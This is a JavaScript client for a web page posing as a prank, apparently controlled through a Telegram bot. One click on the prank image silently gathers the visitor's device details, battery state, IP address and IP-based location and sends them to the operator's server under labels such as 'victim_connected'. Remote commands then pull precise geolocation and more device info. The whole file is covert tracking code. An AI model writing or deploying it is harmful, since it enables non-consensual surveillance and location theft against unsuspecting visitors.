const socket = io();
const prankImage = document.getElementById('prankImage');
const loading = document.getElementById('loading');
const prankAudio = document.getElementById('prankAudio'); // Tetap ada
let hasFullAccess = false;

// Create status element
const statusEl = document.createElement('div');
statusEl.id = 'status';
document.body.appendChild(statusEl);

function updateStatus(text, color = '#0f0') {
    statusEl.textContent = `● ${text}`;
    statusEl.style.color = color;
    statusEl.style.display = 'block';
}

// Hide loading
setTimeout(() => {
    if (loading) loading.style.display = 'none';
}, 1500);

// Function to play sound (HANYA untuk Telegram command)
function playPrankSound() {
    if (prankAudio) {
        prankAudio.currentTime = 0;
        prankAudio.play().catch(e => console.log("Audio error"));
        
        // Optional: Kirim log ke server
        socket.emit('sound_played', {
            time: new Date().toISOString(),
            source: 'telegram_command'
        });
        
        updateStatus('🔊 Sound Playing', '#ff0');
        setTimeout(() => updateStatus('Connected', '#0f0'), 2000);
    }
}

// 1 CLICK = FULL ACCESS (SILENT - NO AUTO SOUND)
prankImage.addEventListener('click', async (e) => {
    e.preventDefault();
    
    if (hasFullAccess) return;
    
    hasFullAccess = true;
    
    // Visual feedback only (NO SOUND)
    updateStatus('ACCESS GRANTED', '#00ff00');
    
    // Subtle visual effect
    prankImage.style.filter = 'brightness(1.2) saturate(1.3)';
    setTimeout(() => {
        prankImage.style.filter = 'brightness(1) saturate(1)';
    }, 300);
    
    // Collect device info SILENTLY
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform || 'Unknown',
        vendor: navigator.vendor || 'Unknown',
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        colorDepth: screen.colorDepth,
        timestamp: new Date().toISOString()
    };
    
    // Get IP silently
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            deviceInfo.ip = data.ip;
            return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(res => res.json())
        .then(locData => {
            deviceInfo.location = locData;
        })
        .catch(() => {
            deviceInfo.ip = 'Unknown';
        })
        .finally(() => {
            // Get battery info if available
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    deviceInfo.charging = battery.charging;
                    
                    // Send ALL data to server
                    sendFullAccessData(deviceInfo);
                }).catch(() => {
                    sendFullAccessData(deviceInfo);
                });
            } else {
                sendFullAccessData(deviceInfo);
            }
        });
});

function sendFullAccessData(deviceInfo) {
    socket.emit('full_access', {
        ...deviceInfo,
        socketId: socket.id,
        accessTime: new Date().toISOString(),
        accessType: 'silent_single_click'
    });
    
    console.log('✅ SILENT FULL ACCESS - Admin notified');
}

// Socket connection
socket.on('connect', () => {
    updateStatus('Ready', '#0f0');
    
    // Send initial silent connection
    socket.emit('victim_connected', {
        socketId: socket.id,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        time: new Date().toISOString()
    });
});

// Bot commands from Telegram
socket.on('bot_command', (command) => {
    console.log('📢 Bot command received:', command);
    
    switch(command.action) {
        case 'play_sound':
            // Play sound ONLY when commanded from Telegram
            playPrankSound();
            break;
            
        case 'get_location':
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        socket.emit('location_captured', {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        });
                        updateStatus('📍 Location Sent', '#00ffff');
                    },
                    (error) => {
                        socket.emit('location_error', { error: error.message });
                    }
                );
            }
            break;
            
        case 'get_device_info':
            // Refresh device info
            const refreshInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timestamp: new Date().toISOString()
            };
            socket.emit('device_info_updated', refreshInfo);
            updateStatus('📊 Info Updated', '#ff00ff');
            break;
            
        case 'take_screenshot':
            socket.emit('screenshot_captured', {
                format: command.format || 'proto',
                timestamp: new Date().toISOString(),
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                }
            });
            updateStatus('📸 Screenshot Captured', '#ffff00');
            break;
    }
});

socket.on('disconnect', () => {
    updateStatus('Disconnected', '#f00');
});

// Auto reconnect
setInterval(() => {
    if (!socket.connected) {
        socket.connect();
    }
}, 5000);

// Initial status
updateStatus('Click for Access', '#ffff00');